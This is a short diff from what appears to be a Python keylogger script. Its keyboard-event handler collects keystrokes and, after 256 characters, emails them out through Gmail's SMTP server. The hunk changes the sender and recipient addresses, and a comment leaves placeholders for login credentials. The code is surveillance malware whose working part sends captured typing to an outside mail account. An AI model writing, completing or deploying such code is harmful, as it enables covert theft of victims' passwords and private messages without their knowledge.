@@ -11,8 +11,8 @@ def OnKeyboardEvent(event):
 	if len(keylog) > 256: # check size of the keystrokes captured
 		server = smtplib.SMTP('smtp.gmail.com:587')
 		# from and to adress to send the mail
-		fromaddr = 'wren0796@outlook.com'
-		toaddr = 'wren0796@gmail.com'
+		fromaddr = 'wren0796@gmail.com'
+		toaddr = 'wren079@outlook.com'
 		server.starttls()
 		# alter this line and include your login credentials 
 		server.login('your@email.com', 'your_password')
